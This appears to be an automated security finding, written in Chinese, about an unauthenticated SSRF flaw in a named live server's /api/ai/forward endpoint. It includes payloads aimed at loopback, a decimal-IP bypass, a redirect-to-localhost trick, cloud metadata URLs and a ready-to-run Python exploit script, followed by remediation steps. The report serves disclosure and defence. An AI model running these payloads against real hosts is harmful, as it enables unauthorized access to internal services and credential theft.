# /api/ai/forward 存在 SSRF：支持任意 URL/方法/自定义头，可访问 127.0.0.1 与内部地址且跟随重定向

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-01-19 02:10:33 UTC
**Target:** http://deepseekgemini.cn:3000
**Endpoint:** /api/ai/forward
**Method:** POST
**CVSS:** 9.9

## Description

在未认证场景下，POST /api/ai/forward 接受用户可控的 JSON 参数（url、method、headers、body、timeoutMs），服务端会按来访者提供的参数代发请求并将对端响应原样返回。该行为可被用于对内网与本机服务进行探测与访问（如 127.0.0.1:80/3000、主机 IP:3000、十进制 IP 2130706433），支持透传自定义请求头（例如 X-Test、X-Method），且可使用非 GET 方法（HEAD、POST）。此外，服务端会在重定向后继续请求目标（例如从允许的外部域 httpbin 跳转至本机 127.0.0.1:3000），未见逐跳校验与目的地址限制。对云元数据地址（169.254.169.254）虽然最终返回 500（操作中止），但响应延时与错误提示表明服务端曾尝试发起该请求，存在进一步被利用的风险。

## Impact

成功利用该 SSRF 漏洞，攻击者可： 
- 访问本机与内网服务（如 127.0.0.1:80/3000、主机公网 IP:3000），读取内部管理页面或调度本地/内网 API。 
- 进行内网端口与服务枚举，通过差异化的状态码/长度/耗时构建内网拓扑。 
- 透传自定义请求头，尝试伪造/探测下游服务的敏感头处理（如可能的凭据探测、网关信任链）。 
- 通过允许的重定向链路绕过浅层限制，将请求导向内网/本机目标。 
- 在某些云环境下，若能成功访问链接本地元数据服务（169.254.169.254/metadata 等），会进一步导致短时令牌与实例信息泄露，显著提升横向移动与账户接管风险。 
业务影响：提高对内部资产的可达性与可见性，潜在绕过边界防护，增加敏感数据暴露与管理接口遭到未授权访问的可能性。外发请求来源在对端显示为 103.118.245.230（依据 httpbin 返回的 origin 字段），佐证服务端代发行为。

## Technical Analysis

端点机制 
- 端点：POST /api/ai/forward 
- 请求体（示例）：{"url": "...", "method": "GET|POST|HEAD", "headers": {...}, "body": "...", "timeoutMs": 5000} 
- 行为：服务端按来访者提供的参数发起对外或对内请求，并将结果返回给客户端；未见目的地址限制或逐跳重定向校验。 

已验证能力（关键证据摘要）： 
1) 基线外部访问（确认代发与头透传） 
- POST /api/ai/forward {"url":"http://httpbin.org/get","method":"GET","headers":{"X-Test":"ssrf-check"}} 
- 响应 200，Content-Type: application/json；对端返回含： 
  "origin": "103.118.245.230" 
  "User-Agent": "node" 
  "X-Test": "ssrf-check" 
→ 证明请求由服务端发起（origin 为服务器出口 IP），且自定义头被透传。 

2) 本机与内网可达性（环回与主机 IP） 
- url: "http://127.0.0.1:3000/" → 200，text/html，长度约 10016（站点 HTML 片段起始为 "<!DOCTYPE html><!--DR05Aa..."） 
- url: "http://127.0.0.1:80/" → 200，text/html，长度约 10016 
- url: "http://localhost:3000/" → 200，text/html，长度约 10016 
- url: "http://103.118.245.230:3000/" → 200，text/html，长度约 10016 
- url: "http://2130706433:3000/"（127.0.0.1 的十进制表示）→ 200，text/html，长度约 10016 
→ 证明可直接访问本机与本服务端口，且可绕过仅对常规 IP 表示的简单拦截。 

3) 重定向链路跟随（未逐跳校验） 
- url: "http://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A3000%2F&status_code=302" 
- 响应 200，text/html，长度约 10016（站点 HTML）； 
→ 证明服务端在重定向后继续访问目标地址（本机 127.0.0.1），未见目的地址再校验。 

4) 方法与头部控制 
- POST: url "http://httpbin.org/post"，headers 含 "Content-Type":"application/json","X-Method":"POST-Check"，body: {"foo":"bar"} 
- 响应 200，application/json；对端回显 data 与自定义头： 
  "data": "{\"foo\": \"bar\", \"n\": 123}" 
  "X-Method": "POST-Check" 
- HEAD: 对 "http://httpbin.org/get" 返回 200（空体，表明方法可控）。 

5) 云元数据尝试 
- url: "http://169.254.169.254/latest/meta-data/"、"http://169.254.169.254/metadata/instance?api-version=2021-02-01" 等 
- 响应 500，body: {"error":"This operation was aborted"}，耗时约 5.4s~5.5s 
→ 表明服务端尝试发起请求但被中止/拦截，仍证实该端点可被用来探测链路本地资源。 

综上，/api/ai/forward 为通用请求转发（开放目的地址、方法与头），可到达环回、本机与主机 IP，并可跟随重定向，无明确逐跳目的校验，是标准且可利用的 SSRF 模式。

## Proof of Concept

复现步骤（未认证即可）： 
1) 基线验证（确认代发与头透传） 
   - POST /api/ai/forward，JSON: {"url":"http://httpbin.org/get","method":"GET","headers":{"X-Test":"ssrf-check"}} 
   - 预期：200；响应包含 "origin":"103.118.245.230"，且 "X-Test":"ssrf-check" 存在于 headers。 

2) 本机访问（环回） 
   - POST /api/ai/forward，JSON: {"url":"http://127.0.0.1:3000/","method":"GET"} 
   - 预期：200；Content-Type: text/html；长度约 10016；正文为站点 HTML。 

3) 十进制 IP 环回 
   - POST /api/ai/forward，JSON: {"url":"http://2130706433:3000/","method":"GET"} 
   - 预期：200；返回站点 HTML（同上），说明可绕过单一地址格式限制。 

4) 重定向到本机 
   - POST /api/ai/forward，JSON: {"url":"http://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A3000%2F&status_code=302","method":"GET"} 
   - 预期：200；返回站点 HTML，证明在重定向后仍继续请求目标且未逐跳校验。 

5) 方法与头部控制（可选补充） 
   - POST /api/ai/forward，JSON: {"url":"http://httpbin.org/post","method":"POST","headers":{"Content-Type":"application/json","X-Method":"POST-Check"},"body":"{\"foo\":\"bar\",\"n\":123}"} 
   - 预期：200；对端回显 data 与自定义头，证明方法与头可控。

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import time
import json
import requests

BASE = "http://deepseekgemini.cn:3000/api/ai/forward"

def forward(url: str, method: str = "GET", headers: dict | None = None, body: str | None = None, timeout_ms: int = 5000) -> dict:
    payload = {
        "url": url,
        "method": method,
        "headers": headers or {},
        "body": body,
        "timeoutMs": timeout_ms
    }
    start = time.time()
    r = requests.post(BASE, headers={"Content-Type":"application/json","Accept":"application/json","User-Agent":"Mozilla/5.0"}, data=json.dumps(payload), timeout=30)
    elapsed = (time.time() - start) * 1000
    ct = r.headers.get("Content-Type", "")
    body_text = r.text
    return {
        "status": r.status_code,
        "content_type": ct,
        "length": len(body_text.encode("utf-8")),
        "time_ms": int(elapsed),
        "snippet": body_text[:500]
    }

def show(title: str, res: dict):
    print(f"== {title} ==")
    print(f"Status: {res['status']}, Content-Type: {res['content_type']}, Length: {res['length']}, Time: {res['time_ms']}ms")
    print("Body (first 500 chars):")
    print(res["snippet"])
    print("-" * 80)

def main():
    tests = [
        ("Baseline - httpbin GET with header relay",
         {"url":"http://httpbin.org/get","method":"GET","headers":{"X-Test":"ssrf-check"}}),
        ("Loopback - 127.0.0.1:3000",
         {"url":"http://127.0.0.1:3000/","method":"GET"}),
        ("Decimal IP - 2130706433:3000",
         {"url":"http://2130706433:3000/","method":"GET"}),
        ("Redirect to loopback (302 -> 127.0.0.1:3000)",
         {"url":"http://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A3000%2F&status_code=302","method":"GET"}),
    ]
    for title, args in tests:
        res = forward(**args)
        show(title, res)

if __name__ == "__main__":
    main()
```

## Remediation

分层修复与防护建议： 
1) 目的地址严格白名单（Deny-by-default）：仅允许必要的受控外部域名与协议，禁止对任意主机/IP/端口的访问。 
2) 全量阻断本地与私有网段（解析后校验）：在 DNS 解析与重定向每一跳后进行 IP 校验，拒绝 127.0.0.0/8、localhost、0.0.0.0、::1、私有网段（10/8、172.16/12、192.168/16）、链路本地（169.254/16）与 IPv6 对应区间、以及十进制/十六进制/混合表示的变体。 
3) 重定向逐跳校验：任何重定向后重新解析与目的校验；若跳转至不允许范围，立即终止而非继续访问。 
4) URL 解析与规范化：使用安全的解析器并统一规范化主机/端口/协议，拒绝含用户信息、奇异编码、非 http(s) 协议或模糊表示。 
5) 方法与头部限制：仅允许 GET；拒绝自定义敏感头（Host、Authorization、X-Forwarded-* 等），对允许的头使用白名单。 
6) 网络出站控制与审计：通过防火墙/代理限制应用运行时的对外网络访问范围，并记录与告警异常目的地址与高风险模式。 
7) 响应裁剪与去敏：对被代理的响应进行类型与大小限制，避免原样返回内部页面或错误细节。 
8) 监控与检测：对频繁的失败访问、私有网段目标、异常重定向模式进行日志分析与告警，建立指标与审计报表。 
9) 安全测试回归：修复后对环回、私网、云元数据与重定向绕过进行系统化回归测试，确保无变体绕过。

